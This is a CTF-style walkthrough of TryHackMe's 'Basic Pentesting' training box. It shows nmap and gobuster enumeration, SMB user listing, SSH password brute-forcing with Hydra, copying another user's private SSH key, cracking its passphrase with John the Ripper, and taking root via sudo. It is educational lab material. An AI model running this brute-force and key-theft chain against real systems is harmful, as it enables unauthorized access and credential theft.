---
title: "TryHackMe | Basic Pentesting - Writeup"
excerpt: Writeup for Basic Pentesting from TryHackMe
date: 2019-06-08 00:00:00
categories: [cybersec, infosec, tryhackme]
tags: [brute-force, enumeration, hash cracking, privilege escalation]
---

## Information
Basic Pentesting is a simple box that is available on TryHackMe. It was made to help CyberSec/InfoSec newcomers learn 
more about the tools and tasks that they’d encounter in the field. These are and not limited to brute-forcing, hash 
cracking, service, and privilege escalation.

## Tasks
- Find the services exposed by the machine
- Find the hidden web directory
- Find the usernames and their respective passwords
- Find the root password
 
## Summary
- Use `nmap` to see the services
- Use `gobuster` to find the hidden web directory
- Use `enum4linux` to gather info regarding the accounts/users present in the system
- Use `Hydra` to brute-force into one of the accounts/users
- Use `John The Ripper` to brute-force into the other account/user and acquire the root password
 
## Tools Used
- `nmap`
- `gobuster`
- `ssh`
- `Hydra`
- `John The Ripper`

## Walkthrough
### nmap
We begin with a `nmap` scan to see the services and to get an idea of what we're dealing with.

```
$ nmap -sC -sV -p- 10.0.0.45

[...]

PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 db:45:cb:be:4a:8b:71:f8:e9:31:42:ae:ff:f8:45:e4 (RSA)
|   256 09:b9:b9:1c:e0:bf:0e:1c:6f:7f:fe:8e:5f:20:1b:ce (ECDSA)
|_  256 a5:68:2b:22:5f:98:4a:62:21:3d:a2:e2:c5:a9:f7:c2 (ED25519)
80/tcp   open  http        Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
8009/tcp open  ajp13       Apache Jserv (Protocol v1.3)
| ajp-methods: 
|_  Supported methods: GET HEAD POST OPTIONS
8080/tcp open  http        Apache Tomcat 9.0.7
|_http-favicon: Apache Tomcat
|_http-open-proxy: Proxy might be redirecting requests
|_http-title: Apache Tomcat/9.0.7
Service Info: Host: BASIC2; OS: Linux; CPE: cpe:/o:linux:linux_kernel

[...]
```

The most notable info here is that `SSH` on Port 22 and `HTTP` on Port 80.

### HTTP
If we visit the IP address we were given (in my instance, it's `10.0.0.45`) to take a look at the HTTP service, we’ll 
see this:

![Homepage][Homepage]

If we take a look at the source code of the page we’ll see this:

```html
<html>

<h1>Undergoing maintenance</h1>

<h4>Please check back later</h4>

<!-- Check our dev note section if you need to know what to work on. -->

</html>
```

This hints us to a hidden directory. To find this we’ll use `gobuster`. Do note `directory-list-2.3-medium.txt` was 
copied from `/usr/share/wordlists/dirbuster/`.

```
$ gobuster dir -u http://10.0.0.90 -w directory-list-2.3-medium.txt

=====================================================
Gobuster v2.0.1              OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://10.0.0.90/
[+] Threads      : 10
[+] Wordlist     : directory-list-2.3-medium.txt
[+] Status codes : 200,204,301,302,307,403
[+] Timeout      : 10s
=====================================================
2019/06/06 09:16:34 Starting gobuster
=====================================================
/development (Status: 301)
/server-status (Status: 403)
=====================================================
2019/06/06 09:59:10 Finished
=====================================================
```

`gobuster` found a hidden directory named `/development`. Taking a look at `10.0.0.45/development`, we'll see this:

![Development][Development]

There are 2 text documents here. Let's take a look at the first one; `dev.txt`:

```
2018-04-23: I've been messing with that struts stuff, and it's pretty cool! I think it might be neat
to host that on this server too. Haven't made any real web apps yet, but I have tried that example
you get to show off how it works (and it's the REST version of the example!). Oh, and right now I'm 
using version 2.5.12, because other versions were giving me trouble. -K

2018-04-22: SMB has been configured. -K

2018-04-21: I got Apache set up. Will put in our content later. -J
```

And the latter; `j.txt`, reads:

```
For J:

I've been auditing the contents of /etc/shadow to make sure we don't have any weak credentials,
and I was able to crack your hash really easily. You know our password policy, so please follow
it? Change that password ASAP.

-K
```

This tells us two things:
- There are two users on the system; J and K.
- J’s password is easily crackable.

### Finding the Usernames

Now that we know there are 2 users; J and K, lets use `enum4linux` to find what their usernames are on the machine.

```
$ enum4linux 10.0.0.90

[...]

[+] Enumerating users using SID S-1-22-1 and logon username '', password ''
S-1-22-1-1000 Unix User\kay (Local User)
S-1-22-1-1001 Unix User\jan (Local User)

[...]
```

`enum4linux` found our usernames to be `jan` and `kay`.

### Brute-forcing Our Way to SSH

Now that we know what our usernames are, let's brute-force our way to the system. We’ll achieve this by running `Hydra` 
(or `Sparta` if you prefer a GUI like I do) and use the following [wordlist][Wordlist].

![Sparta 1][Sparta 1]

`Sparta` found Jan’s password to be `armando`. If we repeat the same process for Kay, we’ll return empty-handed, so we 
must try a different approach. We can safely assume that we’ll be given clues regarding Kay when we `SSH` as Jan.

![Sparta 2]

### SSH
Now we can access `SSH` as Jan. Let's see what we got.

```
$ ssh jan@10.0.0.90
jan@10.0.0.90's password: 

jan@basic2:~$ ls -la
total 12
drwxr-xr-x 2 root root 4096 Apr 23  2018 .
drwxr-xr-x 4 root root 4096 Apr 19  2018 ..
-rw------- 1 root jan    47 Apr 23  2018 .lesshst

jan@basic2:~$ cd ..

jan@basic2:/home$ ls -la
total 16
drwxr-xr-x  4 root root 4096 Apr 19  2018 .
drwxr-xr-x 24 root root 4096 Apr 23  2018 ..
drwxr-xr-x  2 root root 4096 Apr 23  2018 jan
drwxr-xr-x  5 kay  kay  4096 Apr 23  2018 kay

jan@basic2:/home$ cd kay

jan@basic2:/home/kay$ ls -la
total 48
drwxr-xr-x 5 kay  kay  4096 Apr 23  2018 .
drwxr-xr-x 4 root root 4096 Apr 19  2018 ..
-rw------- 1 kay  kay   756 Apr 23  2018 .bash_history
-rw-r--r-- 1 kay  kay   220 Apr 17  2018 .bash_logout
-rw-r--r-- 1 kay  kay  3771 Apr 17  2018 .bashrc
drwx------ 2 kay  kay  4096 Apr 17  2018 .cache
-rw------- 1 root kay   119 Apr 23  2018 .lesshst
drwxrwxr-x 2 kay  kay  4096 Apr 23  2018 .nano
-rw------- 1 kay  kay    57 Apr 23  2018 pass.bak
-rw-r--r-- 1 kay  kay   655 Apr 17  2018 .profile
drwxr-xr-x 2 kay  kay  4096 Apr 23  2018 .ssh
-rw-r--r-- 1 kay  kay     0 Apr 17  2018 .sudo_as_admin_successful
-rw------- 1 root kay   538 Apr 23  2018 .viminfo

jan@basic2:/home/kay$ cat pass.bak
cat: pass.bak: Permission denied

jan@basic2:/home/kay$ cd .ssh/

jan@basic2:/home/kay/.ssh$ ls -la
total 20
drwxr-xr-x 2 kay kay 4096 Apr 23  2018 .
drwxr-xr-x 5 kay kay 4096 Apr 23  2018 ..
-rw-rw-r-- 1 kay kay  771 Apr 23  2018 authorized_keys
-rw-r--r-- 1 kay kay 3326 Apr 19  2018 id_rsa
-rw-r--r-- 1 kay kay  771 Apr 19  2018 id_rsa.pub
```

Kay appears to have our final flag but we can't access `pass.bak` as it's only available to Kay. If we navigate further, 
we'll see a directory named `.ssh`, where there's a file named `id_rsa`; which is an `SSH` key. Let's copy it to our PC 
to use it to log ourselves back in as Kay.

### Logging as Kay
Let's take a look at that `SSH` key that we just got off of Kay’s directory as Jan.

```
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,6ABA7DE35CDB65070B92C1F760E2FE75

[...]
-----END RSA PRIVATE KEY-----
```

Now that we have Kay’s private RSA key, let's try to use it. 

```
$ chmod -600 id_rsa

$ ssh -i id_rsa kay@10.0.0.45
Enter passphrase for key 'id_rsa':
```

`id_rsa` seems to be password protected. In order to use it, let's convert the key to a hash, then use `John The Ripper` 
(or `Johnny` if you prefer a GUI like I do) to find the password, To convert `id_rsa` to `.hash`, run the following 
command:

```
$ ssh2john id_rsa > kay.hash
```

You may not have `ssh2john` in your `John The Ripper` installation. To fix that place [this][ssh2john] `.py` in your 
`/usr/sbin` and make sure it's executable.

Now we can use `kay.hash` in `Johnny` and brute-force it.

![John The Ripper 1][JTR 1]

I’ll be using `rockyou.txt` to brute-force this time. This is available in `/usr/share/wordlists` if you are on Kali 
Linux (just be sure to extract the `.tar.gz`).

![John The Ripper 2][JTR 2]

![John The Ripper 3][JTR 3]

Our password is `beeswax`. Now we can login to `SSH` as Kay and get our final flag.

```
$ ssh -i id_rsa kay@10.0.0.90
Enter passphrase for key 'id_rsa':

kay@basic2:~$ ls -la
total 48
drwxr-xr-x 5 kay  kay  4096 Apr 23  2018 .
drwxr-xr-x 4 root root 4096 Apr 19  2018 ..
-rw------- 1 kay  kay   756 Apr 23  2018 .bash_history
-rw-r--r-- 1 kay  kay   220 Apr 17  2018 .bash_logout
-rw-r--r-- 1 kay  kay  3771 Apr 17  2018 .bashrc
drwx------ 2 kay  kay  4096 Apr 17  2018 .cache
-rw------- 1 root kay   119 Apr 23  2018 .lesshst
drwxrwxr-x 2 kay  kay  4096 Apr 23  2018 .nano
-rw------- 1 kay  kay    57 Apr 23  2018 pass.bak
-rw-r--r-- 1 kay  kay   655 Apr 17  2018 .profile
drwxr-xr-x 2 kay  kay  4096 Apr 23  2018 .ssh
-rw-r--r-- 1 kay  kay     0 Apr 17  2018 .sudo_as_admin_successful
-rw------- 1 root kay   538 Apr 23  2018 .viminfo

kay@basic2:~$ cat pass.bak
heresareallystrongpasswordthatfollowsthepasswordpolicy$$
```

Our final flag is `heresareallystrongpasswordthatfollowsthepasswordpolicy$$`. Thus we’ve finished our box.

### Additional Flag
The author of the box has left us an extra flag that we can capture. To do that we must login as root and navigate to 
`/root`.

```
kay@basic2:~$ sudo bash
[sudo] password for kay:

root@basic2:~# cd /root

root@basic2:/root# ls -la
total 28
drwx------  3 root root 4096 Apr 23  2018 .
drwxr-xr-x 24 root root 4096 Apr 23  2018 ..
-rw-------  1 root root  510 Apr 23  2018 .bash_history
-rw-r--r--  1 root root 3106 Oct 22  2015 .bashrc
-rw-r--r--  1 root root 1017 Apr 23  2018 flag.txt
drwxr-xr-x  2 root root 4096 Apr 18  2018 .nano
-rw-r--r--  1 root root  148 Aug 17  2015 .profile
```

Taking a look at `flag.txt` reveals this message:

```
Congratulations! You've completed this challenge. There are two ways (that I'm aware of) to gain
a shell, and two ways to privesc. I encourage you to find them all!

If you're in the target audience (newcomers to pentesting), I hope you learned something. A few
takeaways from this challenge should be that every little bit of information you can find can be
valuable, but sometimes you'll need to find several different pieces of information and combine
them to make them useful. Enumeration is key! Also, sometimes it's not as easy as just finding
an obviously outdated, vulnerable service right away with a port scan (unlike the first entry
in this series). Usually you'll have to dig deeper to find things that aren't as obvious, and
therefore might've been overlooked by administrators.

Thanks for taking the time to solve this VM. If you choose to create a writeup, I hope you'll send
me a link! I can be reached at josiah@vt.edu. If you've got questions or feedback, please reach
out to me.

Happy hacking!
```

[Homepage]:     /images/posts/2019-06-08-thm-basic_pentesting/Homepage.png
[Development]:  /images/posts/2019-06-08-thm-basic_pentesting/Developement.png
[Wordlist]:     https://gist.github.com/Arszilla/26afd42bddc5f0094a33f5c4db24f737
[Sparta 1]:     /images/posts/2019-06-08-thm-basic_pentesting/Sparta%201.png
[Sparta 2]:     /images/posts/2019-06-08-thm-basic_pentesting/Sparta%202.png
[ssh2john]:     https://github.com/magnumripper/JohnTheRipper/blob/bleeding-jumbo/run/ssh2john.py
[JTR 1]:        /images/posts/2019-06-08-thm-basic_pentesting/John%20The%20Ripper%201.png
[JTR 2]:        /images/posts/2019-06-08-thm-basic_pentesting/John%20The%20Ripper%202.png
[JTR 3]:        /images/posts/2019-06-08-thm-basic_pentesting/John%20The%20Ripper%203.png
